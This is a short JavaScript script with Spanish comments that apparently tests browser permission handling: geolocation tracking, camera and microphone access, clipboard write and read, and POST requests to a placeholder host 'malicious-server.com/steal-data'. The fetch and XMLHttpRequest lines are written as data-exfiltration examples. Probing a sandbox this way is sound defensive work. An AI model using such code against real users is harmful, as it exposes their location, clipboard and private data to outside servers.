navigator.geolocation.watchPosition(
  (position) => {
      console.log(`📍 Ubicación obtenida: ${position.coords.latitude}, ${position.coords.longitude}`);
  },
  (error) => {
      console.error("❌ Error al obtener la ubicación:", error);
  }
);

// 🎙️ 1️⃣ Prueba de acceso a Cámara/Micrófono
navigator.mediaDevices.getUserMedia({ video: true, audio: true })
  .then(() => console.log("✅ Cámara/Micrófono activado"))
  .catch((err) => console.error("❌ Error en getUserMedia():", err));

// 📋 2️⃣ Prueba de Portapapeles
navigator.clipboard.writeText("Texto malicioso")
  .then(() => console.log("✅ Texto escrito en portapapeles"))
  .catch((err) => console.error("❌ Error en clipboard.writeText():", err));

navigator.clipboard.readText()
  .then((texto) => console.log(`✅ Texto leído del portapapeles: ${texto}`))
  .catch((err) => console.error("❌ Error en clipboard.readText():", err));

// 📡 3️⃣ Prueba de Fetch
fetch("https://malicious-server.com/steal-data", { method: "POST", body: JSON.stringify({ key: "value" }) })
  .then(() => console.log("✅ Fetch ejecutado"))
  .catch(() => console.error("❌ Error en Fetch"));

// 🌐 4️⃣ Prueba de XMLHttpRequest
let xhr = new XMLHttpRequest();
xhr.open("POST", "https://malicious-server.com/steal-data", true);
xhr.send(JSON.stringify({ key: "value" }));
console.log("✅ XMLHttpRequest ejecutado");